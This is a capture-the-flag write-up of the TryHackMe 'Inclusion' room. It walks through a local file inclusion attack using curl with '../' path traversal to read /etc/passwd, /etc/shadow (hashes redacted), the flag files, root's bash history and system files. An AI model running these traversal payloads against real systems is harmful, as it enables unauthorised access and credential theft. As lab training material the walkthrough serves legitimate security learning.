# Room
https://tryhackme.com/room/inclusion

# Task 1
Deploy

# Task 2
* Enumeration - check site for LFI parameters
    ```
    curl --silent http://10.10.233.235 | grep "?"
                <p><a class="btn btn-secondary" href="/article?name=hacking" role="button">View details &raquo;</a></p>
                <p><a class="btn btn-secondary" href="/article?name=lfiattack" role="button">View details &raquo;</a></p>
                <p><a class="btn btn-secondary" href="/article?name=rfiattack" role="button">View details &raquo;</a></p>
    ```
* LFI references
    * https://book.hacktricks.xyz/pentesting-web/file-inclusion
    * https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
* LFI test - check /etc/passwd
    ```
    curl --silent http://10.10.233.235/article?name=../../etc/passwd | grep -v -e "^$" | grep -v "<"
    ```
* LFI test - check /etc/passwd, one level deeper
    ```
    curl --silent http://10.10.233.235/article?name=../../../etc/passwd | grep -v -e "^$" | grep -v "<"                     
            
                root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
    systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
    syslog:x:102:106::/home/syslog:/usr/sbin/nologin
    messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
    _apt:x:104:65534::/nonexistent:/usr/sbin/nologin
    lxd:x:105:65534::/var/lib/lxd/:/bin/false 
    uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
    dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
    landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
    pollinate:x:109:1::/var/cache/pollinate:/bin/false
    falconfeast:x:1000:1000:falconfeast,,,:/home/falconfeast:/bin/bash
    ```
* LFI - check /etc/shadow
    ```
    curl --silent http://10.10.233.235/article?name=../../../etc/shadow | grep -v -e "^$" | grep -v "<"
            
                root:$6$[removed]
    falconfeast:$6$[removed]
    ```
* Grab flags
    ```
    curl --silent http://10.10.233.235/article?name=../../../home/falconfeast/user.txt | grep -v -e "^$" | grep -v "<"      
                                    
                [removed]
                                    
    curl --silent http://10.10.233.235/article?name=../../../root/root.txt | grep -v -e "^$" | grep -v "<"                  
                                    
                [removed]
    ```
* Check other interesting files
    ```
    curl --silent http://10.10.233.235/article?name=../../../root/.bash_history | grep -v -e "^$" | grep -v "<" | head      
    grep: (standard input): binary file matches       
                                                    
                ls                                    
    cd ~                                              
    ls                                                
    ls -la                                            
    wget http://192.168.1.107:8000/authorized_keys    
    ls                                                
    mv authorized_keys .ssh/                          
    ls                                                
    mkdir .ssh                

    curl --silent http://10.10.233.235/article?name=../../../etc/hosts | grep -v -e "^$" | grep -v "<" | head               
                                                                
                127.0.0.1   localhost                           
    127.0.1.1       inclusion                                   
    # The following lines are desirable for IPv6 capable hosts  
    ::1     localhost ip6-localhost ip6-loopback                
    ff02::1 ip6-allnodes                                        
    ff02::2 ip6-allrouters           

    curl --silent http://10.10.233.235/article?name=../../../proc/version | grep -v -e "^$" | grep -v "<"
            
                Linux version 4.15.0-74-generic (buildd@lcy01-amd64-022) (gcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04.1)) #84-Ubuntu SMP Thu Dec 19 08:06:28 UTC 2019    
    ```